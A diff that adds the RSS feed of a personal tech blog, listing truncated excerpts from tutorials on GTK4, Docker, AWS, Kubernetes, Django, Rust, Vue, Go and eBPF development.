@@ -1,0 +1,1948 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Posts on Xiao.chen</title>
+    <link>https://blog.wisekee.com/post/</link>
+    <description>Recent content in Posts on Xiao.chen</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <copyright>Copyright © 2008–2020, Xiao.chen; all rights reserved.</copyright>
+    <lastBuildDate>Tue, 18 Feb 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.wisekee.com/post/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Use c language and GTK4,Msys2 to development lightweight Windows GUI app</title>
+      <link>https://blog.wisekee.com/post/use-gtk-wingw64/</link>
+      <pubDate>Tue, 18 Feb 2025 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/use-gtk-wingw64/</guid>
+      <description>
+        
+          
+            Environment Preparing Download and installation the Msys2 After install the wsys2 open and create shortcut ucrt64.exe to desktop In ucrt64.exe console shell use pacman to install packages 1 2pacman -Syu 3#Repeat this step until all packages are up to date. 4#Follow any given instructions Installation the essential packages 1 2 pacman -S mingw-w64-x86_64-gtk4 3 pacman -S mingw-w64-x86_64-toolchain base-devel Test and verify the packages 1 gcc --version 2 #Discovers the directories where the GTK include files are stored.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Some online interactive tutorial for programming</title>
+      <link>https://blog.wisekee.com/post/online-interactive-tutorial/</link>
+      <pubDate>Mon, 20 Jan 2025 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/online-interactive-tutorial/</guid>
+      <description>
+        
+          
+            Step by Step to study programming or learning one tools or technology
+Some playgrounds website Play with Docker Classroom killercoda: Interactive environments For tech you study, teach or present ximiuz labs oreilly learning platform play-with-kubernetes Build real projects 
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>The SSE(server sent event) example</title>
+      <link>https://blog.wisekee.com/post/the-server-sent-events/</link>
+      <pubDate>Tue, 10 Dec 2024 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/the-server-sent-events/</guid>
+      <description>
+        
+          
+            SSE establishes a one-way communication channel from server to client over HTTP. Unlike WebSockets&amp;rsquo; bidirectional connection, SSE maintains an open HTTP connection for server-to-client updates. Think of it as a radio broadcast: the server (station) transmits, and clients (receivers) listen. The LLM completion API is most use SSE event to interactive with human in chat web ui
+The directory level look like following this 1├── bin 2│ ├── Activate.ps1 3│ ├── activate 4│ ├── activate.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Setup the Dify and vllm in AWS G4dn instance</title>
+      <link>https://blog.wisekee.com/post/dify-vllm-ec2/</link>
+      <pubDate>Wed, 20 Nov 2024 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/dify-vllm-ec2/</guid>
+      <description>
+        
+          
+            The first step launch the AWS ec2 type G4dn-xlarge 1# initialization the default ebs volume 2sudo file -s /dev/nvme2n1 3lsblk -f 4mkfs -t xfs /dev/nvme2n1 5mount /dev/nvme2n1 /mnt 6 7# persistent the mount info to `/etc/fstab` 8# view the UUID 9blkid 10 11# write the information 12echo &amp;#34;UID=xxxxx-3047-437a-81f0-xxxxx /mnt xfs defaults,nofail 0 2&amp;#34; &amp;gt;&amp;gt; /etc/fstab Extends the root ebs volume 1# modify the ebs volume size in aws console 2# extend the partition 3growpart /dev/nvme0n1 1 4# extend thf filesystem 5resize2fs /dev/nvme0n1p1 Install the docker-ce 1# Add Docker&amp;#39;s official GPG key: 2sudo apt-get update 3sudo apt-get install ca-certificates curl 4sudo install -m 0755 -d /etc/apt/keyrings 5sudo curl -fsSL https://download.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>How to setup the TTS LLM model GPT-SoVITS</title>
+      <link>https://blog.wisekee.com/post/setup-gpt-sovits/</link>
+      <pubDate>Sun, 10 Nov 2024 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/setup-gpt-sovits/</guid>
+      <description>
+        
+          
+            Features: (GPT-SoVITS)[https://github.com/RVC-Boss/GPT-SoVITS]
+Zero-shot TTS: Input a 5-second vocal sample and experience instant text-to-speech conversion. Few-shot TTS: Fine-tune the model with just 1 minute of training data for improved voice similarity and realism. Cross-lingual Support: Inference in languages different from the training dataset, currently supporting English, Japanese, Korean, Cantonese and Chinese. WebUI Tools: Integrated tools include voice accompaniment separation, automatic training set segmentation, Chinese ASR, and text labeling, assisting beginners in creating training datasets and GPT/SoVITS models.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Some css reset or tricks in projects</title>
+      <link>https://blog.wisekee.com/post/css_trick/</link>
+      <pubDate>Wed, 23 Oct 2024 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/css_trick/</guid>
+      <description>
+        
+          
+            This is for notes, and may be use the AI agent or chat to explain some rules.
+The some css rule syntax 1/* The css background gradient */ 2background: repeating-linear-gradient( 3 var(--first-color) 0%, 4 var(--first-color) 40%, 5 var(--second-color) 40%, 6 var(--second-color) 80% 7); The example of some css rules 1/* Define the variables in root level can inherit to sibling */ 2:root { 3 --building-color1: #aa80ff; 4 --building-color2: #66cc99; 5 --building-color3: #cc6699; 6} 7 8/* resetting the box model */ 9*{ 10 box-sizing: border-box; 11 font-family: sans-serif; 12} 13 14/* or use the pseudo selector to do this */ 15*, ::before, ::after{ 16 box-sizing: inherit; 17} 18 19/* 20pseudo select for specific class 21This property is for screen reader 22*/ 23span[class~=&amp;#34;sr-only&amp;#34;] { 24 border: 0; 25 /* clip the elements */ 26 clip: rect(1px, 1px, 1px, 1px); /* creates a 1px by 1px clipping rectangle, essentially hiding everything except for a very tiny area.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Django getting started</title>
+      <link>https://blog.wisekee.com/post/django-getting-stared/</link>
+      <pubDate>Sun, 20 Oct 2024 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/django-getting-stared/</guid>
+      <description>
+        
+          
+            Create project scaffolding Create the project folder and initialization the virtual environment 1 2# Create the project directory 3mkdir djangoApp 4cd djangoApp 5 6# Initialization the virtual environment 7python -m venv ~/.venv/global 8source ~/.venv/global/bin/activate 9 10# Install the Django framework 11pip install django Create the project 1mkdir myDjangoProject 2django-admin startproject mysite myDjangoProject 3cd myDjangoProject 4# create the app in project 5python manage.py startapp polls 6 7# can create another app in this project 8python manage.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Open source text to image and image LLM</title>
+      <link>https://blog.wisekee.com/post/text_to_image_llm/</link>
+      <pubDate>Thu, 10 Oct 2024 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/text_to_image_llm/</guid>
+      <description>
+        
+          
+            Large models related to image processing OmniGen: Unified Image Generation. FLUX.1 minimal inference code to run image generation Llama OCRAbout Document to Markdown OCR library with Llama 3.2 vision deepfaceAbout A Lightweight Face Recognition and Facial Attribute Analysis (Age, Gender, Emotion and Race) Library for Python PIXART-αFast Training of Diffusion Transformer for Photorealistic Text-to-Image Synthesis LTX-VideoDiT-based video generation model Hugging face playground: play ground 
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Awesome AI&#39;s resoures</title>
+      <link>https://blog.wisekee.com/post/awesome-ai/</link>
+      <pubDate>Wed, 10 Jul 2024 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/awesome-ai/</guid>
+      <description>
+        
+          
+            Basic knowledges MLflow: A Tool for Managing the Machine Learning Lifecycle Docs and getting started Introduction to Generative AI Machine Learning Ops Tools and Efficiency Discover, download, and run local LLMs Go ahead and axolotl questions A template for Metaflow cards Machine Learning Toolkit for Kubernetes LightGBM is a gradient boosting framework XGBoost is an optimized distributed gradient boosting library 1 min voice data can also be used to train a good TTS model Kokoro is a frontier TTS model for its size.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Talos launch kubernetes in aws environment getting started </title>
+      <link>https://blog.wisekee.com/post/talos-k8s-aws/</link>
+      <pubDate>Sun, 02 Jun 2024 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/talos-k8s-aws/</guid>
+      <description>
+        
+          
+            talos in aws
+the all talos nodes don&amp;rsquo;t enable public ip, can use private subnet and vpc ip cidr
+Operate workflow ​Installation the talosctl to operator machine talosctl Create aws resources VPC Subnet SecurityGroup NetworkLoadbalancer : listener tcp 443 forward to control plane nodes tcp: 6443 TargetGroup: for control plane port tcp: 6443 Setup the environment variables, the talosctl command generate config file need the Env Variables 1REGION=&amp;#34;us-east-1&amp;#34; 2VPC=&amp;#34;vpc-xxxxxx&amp;#34; 3SUBNET=&amp;#34;subnet-xxxxxx&amp;#34; 4AMI=`curl -sL https://github.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Use Copa to patch the container images</title>
+      <link>https://blog.wisekee.com/post/copa-docker-image-patch/</link>
+      <pubDate>Thu, 23 May 2024 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/copa-docker-image-patch/</guid>
+      <description>
+        
+          
+            The steps for image patch pull the image use: nerdctl pull xxxxx scan the image vulnerable: TRIVY_DEBUG=true trivy image --timeout 10m --scanners vuln --vuln-type os --ignore-unfixed -f json -o ${JSON_FILE_NAME}.json ${IMAGE} patch the image: copa patch -r ${JSON_FILE_NAME}.json -i $IMAGE -t ${2} --addr unix:///run/user/501/buildkit-default/buildkitd.sock --timeout 20m Use lima to management the buildkit virtual machine installation the lima 1brew install lima 2# launch virtual machine use template, the template can: template://docker, template://k8s 3limactl create --name=default template://buildkit 4# stop the virtual machine 5limactl stop buildkit 6 7# in buildkit virtual machine run the containerd 8nerdctl run -d -p 0.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Launch the openldap and dex in kubernetes</title>
+      <link>https://blog.wisekee.com/post/openldap-dex/</link>
+      <pubDate>Sat, 20 Apr 2024 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/openldap-dex/</guid>
+      <description>
+        
+          
+            Generate the PKI for openldap Caution: the certificate&amp;rsquo;s subject&#39;s domain component (DC) can with openldap DN same to name 1# install the certtool 2apt install gnutls-bin 3# generate the ca.key 4certtool --generate-privkey --outfile ca.key 5# generate the ca certificate 6certtool --generate-self-signed --load-privkey ca.key --outfile ca.crt 7# generate the server endpoint private key 8certtool --generate-privkey --outfile tls.key --rsa 9# server endpoint certificate request 10certtool --generate-request --load-privkey tls.key --outfile request.crt 11# use ca certificate to sign the server endpoint certificate 12certtool --generate-certificate --load-request request.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>To use the vite management the react project</title>
+      <link>https://blog.wisekee.com/post/vite-react-getting-started/</link>
+      <pubDate>Thu, 18 Apr 2024 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/vite-react-getting-started/</guid>
+      <description>
+        
+          
+            Install the bun 1HOMEBREW_NO_AUTO_UPDATE=1 brew install oven-sh/bun/bun Initialization the project use bun 1bun create vite@latest part1 --template react 2cd part1 3bun install 4bun run dev Or use the pnpm 1pnpm create vite@latest part1 --template react 
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>How to config debug the go project in vscode</title>
+      <link>https://blog.wisekee.com/post/go-vscode-debug-config/</link>
+      <pubDate>Sat, 09 Mar 2024 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/go-vscode-debug-config/</guid>
+      <description>
+        
+          
+            To debug the go project has many method to achieve it
+The config file specific the program arguments 1{ 2 // Use IntelliSense to learn about possible attributes. 3 // Hover to view descriptions of existing attributes. 4 // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387 5 &amp;#34;version&amp;#34;: &amp;#34;0.2.0&amp;#34;, 6 &amp;#34;configurations&amp;#34;: [ 7 { 8 &amp;#34;name&amp;#34;: &amp;#34;cmd-name&amp;#34;, 9 &amp;#34;type&amp;#34;: &amp;#34;go&amp;#34;, 10 &amp;#34;request&amp;#34;: &amp;#34;launch&amp;#34;, 11 &amp;#34;mode&amp;#34;: &amp;#34;auto&amp;#34;, 12 &amp;#34;program&amp;#34;: &amp;#34;src/cmd/main.go&amp;#34;, 13 &amp;#34;args&amp;#34;: [&amp;#34;aws&amp;#34;, &amp;#34;ecr&amp;#34;, &amp;#34;create-repository&amp;#34;, &amp;#34;--repository-name&amp;#34;, &amp;#34;test/repository&amp;#34;] 14 } 15 ] 16} Set the environment variables 1{ 2 // Use IntelliSense to learn about possible attributes.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>trino&#43;hive metastore&#43;k8s&#43;minio environment prepared</title>
+      <link>https://blog.wisekee.com/post/bigdata-trino-hive-minio-getting-started/</link>
+      <pubDate>Sun, 11 Feb 2024 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/bigdata-trino-hive-minio-getting-started/</guid>
+      <description>
+        
+          
+            Make the Hive images 1FROM openjdk:8u302 2 3WORKDIR /opt/hive 4ENV HADOOP_HOME=/opt/hadoop-3.2.3 5 6ADD ./hadoop-3.2.3 /opt/hadoop-3.2.3 7ADD ./apache-hive-3.1.3-bin /opt/hive 8ADD ./hadoop-3.2.3/share/hadoop/common/lib/guava-27.0-jre.jar /opt/hive/lib/ 9ADD ./hadoop-3.2.3/share/hadoop/tools/lib/hadoop-aws-3.2.3.jar /opt/hive/lib/ 10ADD ./hadoop-3.2.3/share/hadoop/tools/lib/aws-java-sdk-bundle-1.11.901.jar /opt/hive/lib/ 11 12RUN echo &amp;#39;export HIVE_HOME=/opt/hive \n export HIVE_CONF_DIR=/opt/hive/conf \n export PATH=$PATH:$HIVE_HOME/bin&amp;#39; &amp;gt;&amp;gt; ~/.bashrc 13# RUN curl https://jdbc.postgresql.org/download/postgresql-42.7.1.jar --output /opt/hive/lib/postgresql-42.7.1.jar 14RUN rm -rf /opt/hive/lib/guava-19.0.jar Define the docker-compose.yaml 1version: &amp;#39;3.7&amp;#39; 2services: 3 minio: 4 image: &amp;#39;minio/minio:latest&amp;#39; 5 hostname: minio 6 container_name: minio 7 ports: 8 - &amp;#39;9000:9000&amp;#39; 9 - &amp;#39;9001:9001&amp;#39; 10 volumes: 11 - .
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Vue custom component getting started</title>
+      <link>https://blog.wisekee.com/post/vue-custom-components/</link>
+      <pubDate>Sun, 10 Dec 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/vue-custom-components/</guid>
+      <description>
+        
+          
+            Define the custom component MessageBox in vue file this file named MessageBox.vue
+1&amp;lt;template&amp;gt; 2 &amp;lt;transition name=&amp;#34;fade-in&amp;#34; mode=&amp;#34;out-in&amp;#34;&amp;gt; 3 &amp;lt;div 4 v-if=&amp;#34;show&amp;#34; 5 :class=&amp;#34;[&amp;#39;alert&amp;#39;, &amp;#39;notification&amp;#39;, &amp;#39;is-&amp;#39; + type]&amp;#34; 6 :style=&amp;#34;{ transform: &amp;#39;translate(-50%,&amp;#39; + offset + &amp;#39;px)&amp;#39; }&amp;#34; 7 &amp;gt; 8 &amp;lt;button 9 @click=&amp;#34;() =&amp;gt; (this.show = !this.show)&amp;#34; 10 v-show=&amp;#34;this.showBtn&amp;#34; 11 class=&amp;#34;delete&amp;#34; 12 &amp;gt;&amp;lt;/button&amp;gt; 13 &amp;lt;p v-html=&amp;#34;message&amp;#34;&amp;gt;&amp;lt;/p&amp;gt; 14 &amp;lt;/div&amp;gt; 15 &amp;lt;/transition&amp;gt; 16&amp;lt;/template&amp;gt; 17 18&amp;lt;script&amp;gt; 19export default { 20 name: &amp;#34;MessageBox&amp;#34;, 21 props: { 22 message: { 23 thype: String, 24 required: true, 25 }, 26 type: { 27 type: String, 28 default: &amp;#34;default&amp;#34;, 29 }, 30 offset: { 31 type: Number, 32 default: 20, 33 }, 34 showBtn: { 35 type: Boolean, 36 default: true, 37 }, 38 }, 39 data() { 40 return { 41 show: true, 42 }; 43 }, 44 methods: { 45 isShow(status) { 46 this.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>First step to learn Rust programming</title>
+      <link>https://blog.wisekee.com/post/rust-getting-started/</link>
+      <pubDate>Sat, 02 Dec 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/rust-getting-started/</guid>
+      <description>
+        
+          
+            Basic knowledge &amp;amp;str is string literal To do the conversion use the standard String::from(&amp;amp;str) method also can use .to_string() String::from(&amp;quot;Something&amp;quot;) is string data type enum with structs 1// Define a tuple struct 2struct KeyPress(String, char); 3 4// Define a classic struct 5struct MouseClick { x: i64, y: i64 } 6 7// Redefine the enum variants to use the data from the new structs 8// Update the page Load variant to have the boolean type 9enum WebEvent { WELoad(bool), WEClick(MouseClick), WEKeys(KeyPress) } 10 11let we_load = WebEvent::WELoad(true); Project manage commands Cargo commands cargo new to create new project cargo build to build a project cargo run to build and run project cargo test Test a project cargo check Check project types cargo doc Build documentation for a project cargo publish Publish a library to crates.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Dynamic create docker registry pull image credentials in eks cluster for particular  imagePullSecret</title>
+      <link>https://blog.wisekee.com/post/aws-ecr-register-helper/</link>
+      <pubDate>Mon, 20 Nov 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/aws-ecr-register-helper/</guid>
+      <description>
+        
+          
+            When use imagePullSecret to pull image from ecr in eks cluster for particular task etc. Istio WSAM plugin from ecr registry, need specific imagePullSecret
+Basic workflow create cronjob in eks cluster schedule login to ecr and obtain credentials create a secrets in some Namespaces named aws-registry save the docker pull credentals use this secrets in Namespace pull image specific imagePullSecret parameter for example: 1 spec: 2 imagePullPolicy: Always 3 imagePullSecret: aws-registry The Dockerfile to construct cronjob docker image 1FROM python:alpine 2MAINTAINER Mike Petersen &amp;lt;mike@odania-it.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>How to use Tauri development the GUI app</title>
+      <link>https://blog.wisekee.com/post/how_to_use_tauri/</link>
+      <pubDate>Mon, 20 Nov 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/how_to_use_tauri/</guid>
+      <description>
+        
+          
+            The prerequisites Install rust Reference offical site Install the Create-tauri-app Follow the tutorial step by step to create new Tauri project 1cargo install create-tauri-app --locked 2cargo create-tauri-app Select the Frontend language: TypeScript / JavaScript 1 2# Project name · tauri-app 3# ✔ Identifier · com.tauri-app.app 4# ✔ Choose which language to use for your frontend · TypeScript / JavaScript - (pnpm, yarn, npm, deno, bun) 5# ✔ Choose your package manager · pnpm 6# ✔ Choose your UI template · Vue - (https://vuejs.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Use AWS jsii to cross language invoker</title>
+      <link>https://blog.wisekee.com/post/aws-jsii-getting-started/</link>
+      <pubDate>Mon, 20 Nov 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/aws-jsii-getting-started/</guid>
+      <description>
+        
+          
+            You can generate Python, Java, and .NET software libraries from a TypeScript source use jsii of AWS Cloud Development Kit (AWS CDK).
+Initialization the project constructure 1pnpm init -y 2pnpm install --development jsii jsii-pacmak The package.json like following this 1{ 2 &amp;#34;name&amp;#34;: &amp;#34;jsii-demo&amp;#34;, 3 &amp;#34;version&amp;#34;: &amp;#34;1.0.0&amp;#34;, 4 &amp;#34;description&amp;#34;: &amp;#34;A demonstration jsii library&amp;#34;, 5 &amp;#34;main&amp;#34;: &amp;#34;index.js&amp;#34;, 6 &amp;#34;scripts&amp;#34;: { 7 &amp;#34;build&amp;#34;: &amp;#34;jsii&amp;#34;, 8 &amp;#34;build:watch&amp;#34;: &amp;#34;jsii --watch&amp;#34;, 9 &amp;#34;package&amp;#34;: &amp;#34;jsii-pacmak&amp;#34; 10 }, 11 &amp;#34;keywords&amp;#34;: [], 12 &amp;#34;author&amp;#34;: { 13 &amp;#34;name&amp;#34;: &amp;#34;John Doe&amp;#34;, 14 &amp;#34;email&amp;#34;: &amp;#34;john.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>How to create sample frontend in vue use cli and vite</title>
+      <link>https://blog.wisekee.com/post/vue-app-getting-started/</link>
+      <pubDate>Sat, 18 Nov 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/vue-app-getting-started/</guid>
+      <description>
+        
+          
+            The vue cli 1 2npm i -g @vue/cli 3vue --version 4vue create vue-starter-project 5 6# create local development configuration file 7touch .env.development Use NODE_ENV to switch build or compiler and coding 1# can define the different environment file 2touch .env.development.local # to local testing for development don&amp;#39;t commit the git 3touch .env.staging # to staging environment to configuration 4 5# The env file content may be 6echo &amp;#39;NODE_ENV=&amp;#34;staging&amp;#34;&amp;#39; 7 8# integration the env file to launch 9# { 10# .
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Use golang serve the static file embedded to binary file</title>
+      <link>https://blog.wisekee.com/post/golang-web-static-fileserver/</link>
+      <pubDate>Wed, 08 Nov 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/golang-web-static-fileserver/</guid>
+      <description>
+        
+          
+            The golang code to embed file to compile file use the annotatioins to embed folder, this should embed current public folder to binary file
+1 2import ( 3	&amp;#34;embed&amp;#34; 4 &amp;#34;fmt&amp;#34; 5 &amp;#34;os&amp;#34; 6 &amp;#34;io/fs&amp;#34; 7	&amp;#34;net/http&amp;#34; 8 &amp;#34;os/signal&amp;#34; 9	&amp;#34;runtime&amp;#34; 10	&amp;#34;strings&amp;#34; 11	&amp;#34;syscall&amp;#34; 12) 13 14 15//go:embed public 16var staticFiles embed.FS 17 18 19func main() { 20 public, _ := fs.Sub(staticFiles, &amp;#34;public&amp;#34;) 21	// handle static files include HTML, CSS and JavaScripts.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Use the jupyter in venv</title>
+      <link>https://blog.wisekee.com/post/how-to-use-jupyter-in-venv/</link>
+      <pubDate>Mon, 16 Oct 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/how-to-use-jupyter-in-venv/</guid>
+      <description>
+        
+          
+            Installation and use 1pip install jupyterlab 2jupyter lab --app-dir /opt/homebrew/share/jupyter/lab Initialization the venv 1mkdir test-venv 2cd test-venv &amp;amp;&amp;amp; python -m venv . 3source ./bin/activate 4pip install ipykernel 5./bin/python -m ipykernel install --user --name=test-venv How to test the python package in local development Initialization the python package construct 1./ 2 ├── __init__.py 3 ├── sub_packages 4 ├── sub_packages 5 ├── __init__.py Initialization the venv in local global 1python -m venv ~/.venv/global 2source ~/.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Getting started eBPF development</title>
+      <link>https://blog.wisekee.com/post/getting-started-ebpf/</link>
+      <pubDate>Sun, 15 Oct 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/getting-started-ebpf/</guid>
+      <description>
+        
+          
+            Landscape of linux kernel tracing, monitoring,hooking and networking things method, tools.
+Install essential compiler and kernel source code 1apt-get install clang 2sudo apt-get -y install libbpf-dev 3apt install linux-headers-`uname -r` 4sudo ln -s /usr/include/x86_64-linux-gnu/asm /usr/include/asm 5# download kernel source code corresponding kernel version 6git clone --branch $(uname -r | awk -F- &amp;#39;{print $1}&amp;#39; | awk -F. &amp;#39;{print &amp;#34;v&amp;#34; $1 &amp;#34;.&amp;#34; $2}&amp;#39;) --single-branch https://github.com/torvalds/linux.git The sample bpf code 1#include &amp;lt;linux/bpf.h&amp;gt; 2#define SEC(NAME) __attribute__((section(NAME), used)) 3 4static int (*bpf_trace_printk)(const char *fmt, int fmt_size, 5 .
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>How to profile the golang program</title>
+      <link>https://blog.wisekee.com/post/golang_profile/</link>
+      <pubDate>Wed, 11 Oct 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/golang_profile/</guid>
+      <description>
+        
+          
+            For checkout the resources usage in golang, this is simple
+Add the profile code in app 1// Add the flag to arguments to cpu and memory ptoto buffer file store to it 2	rootCmd.PersistentFlags().StringP(&amp;#34;cpuprofile&amp;#34;, &amp;#34;&amp;#34;, &amp;#34;&amp;#34;, &amp;#34;cpu profile file&amp;#34;) 3	rootCmd.PersistentFlags().StringP(&amp;#34;memprofile&amp;#34;, &amp;#34;&amp;#34;, &amp;#34;&amp;#34;, &amp;#34;memory profile file&amp;#34;) 4// whether enable profile 5func enableProfile() { 6	cpu, _ := rootCmd.Flags().GetString(&amp;#34;cpuprofile&amp;#34;) 7	mem, _ := rootCmd.Flags().GetString(&amp;#34;memprofile&amp;#34;) 8	if cpu != &amp;#34;&amp;#34; { 9	f, err := os.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Generation and Verify JWT token in golang</title>
+      <link>https://blog.wisekee.com/post/golang-jwt-example/</link>
+      <pubDate>Sun, 08 Oct 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/golang-jwt-example/</guid>
+      <description>
+        
+          
+            Use HS256 or RS256 to sign and authorization is common JWT methods
+Create the JWT token 1package util 2 3import &amp;#34;github.com/golang-jwt/jwt/v5&amp;#34; 4 5// retrieve JWT key from .env file 6var privateKey = []byte(os.Getenv(&amp;#34;JWT_PRIVATE_KEY&amp;#34;)) 7 8// generate JWT token 9func GenerateJWT(user model.User) (string, error) { 10	tokenTTL, _ := strconv.Atoi(os.Getenv(&amp;#34;TOKEN_TTL&amp;#34;)) 11	//log.Println(time.Now()) 12	//log.Println(time.Now().Add(time.Second * time.Duration(tokenTTL))) 13	token := jwt.NewWithClaims(jwt.SigningMethodHS256, jwt.MapClaims{ 14	&amp;#34;id&amp;#34;: user.ID, 15	&amp;#34;role&amp;#34;: user.RoleID, 16	&amp;#34;iat&amp;#34;: time.Now().Unix(), 17	&amp;#34;eat&amp;#34;: time.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Use terraform or ACK apigatewayv2 EKS operator to set up apigateway in AWS</title>
+      <link>https://blog.wisekee.com/post/aws-apigateway-practice/</link>
+      <pubDate>Thu, 05 Oct 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/aws-apigateway-practice/</guid>
+      <description>
+        
+          
+            The daigram 1 2mock-restapi.example.dev(route53) -----&amp;gt; apigateway -----&amp;gt; vpclink -------&amp;gt; private aws nlb (eks ingress) ---&amp;gt; app servcie Use Terraform to create apigateway restapi resource to apply the resources and mapping the apigateway domain name to route53 to access the eks services
+create the route53 and domain name and vpc link to access eks services 1resource &amp;#34;aws_api_gateway_vpc_link&amp;#34; &amp;#34;to-private-nlb&amp;#34; { 2 name = &amp;#34;to-private-nlb&amp;#34; 3 description = &amp;#34;rest api to private nlb&amp;#34; 4 target_arns = [&amp;#34;arn:aws:elasticloadbalancing:xxxxx:xxxxx:loadbalancer/net/xxxxxx/xxxxxx&amp;#34;] 5} 6 7data &amp;#34;aws_route53_zone&amp;#34; &amp;#34;example_dev&amp;#34; { 8 name = &amp;#34;example.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>How to connect the pod terminal use web browser</title>
+      <link>https://blog.wisekee.com/post/remote-termination-websocket/</link>
+      <pubDate>Mon, 02 Oct 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/remote-termination-websocket/</guid>
+      <description>
+        
+          
+            Reference Building a Browser-based Terminal using Docker and XtermJS Docker attach api Kubernetes dashboard terminal Use a WebSocket client to exec commands in a Kubernetes pod 
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Custom the ec2 user data when instance launch</title>
+      <link>https://blog.wisekee.com/post/aws-ec2-userdata/</link>
+      <pubDate>Wed, 20 Sep 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/aws-ec2-userdata/</guid>
+      <description>
+        
+          
+            Usually, user data scripts are only run the first time the instance is started, however this can be changed using cloud-init to run every time the instance restarts.
+Create the cloud config file 1Content-Type: multipart/mixed; boundary=&amp;#34;//&amp;#34; 2MIME-Version: 1.0 3 4--// 5Content-Type: text/cloud-config; charset=&amp;#34;us-ascii&amp;#34; 6MIME-Version: 1.0 7Content-Transfer-Encoding: 7bit 8Content-Disposition: attachment; filename=&amp;#34;cloud-config.txt&amp;#34; 9 10#cloud-config 11cloud_final_modules: 12 - [scripts-user, always] 13runcmd: 14 - [ mkdir, /test-cloudinit ] 15write_files: 16 - path: /test-cloudinit/cloud-init.txt 17 content: Created by cloud-init 18 19--// 20Content-Type: text/x-shellscript; charset=&amp;#34;us-ascii&amp;#34; 21MIME-Version: 1.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Istio ingress gateway enalbe proxy protocol v2 in AWS network loadbalance</title>
+      <link>https://blog.wisekee.com/post/istio-nlb-proxy-protocolv2/</link>
+      <pubDate>Wed, 20 Sep 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/istio-nlb-proxy-protocolv2/</guid>
+      <description>
+        
+          
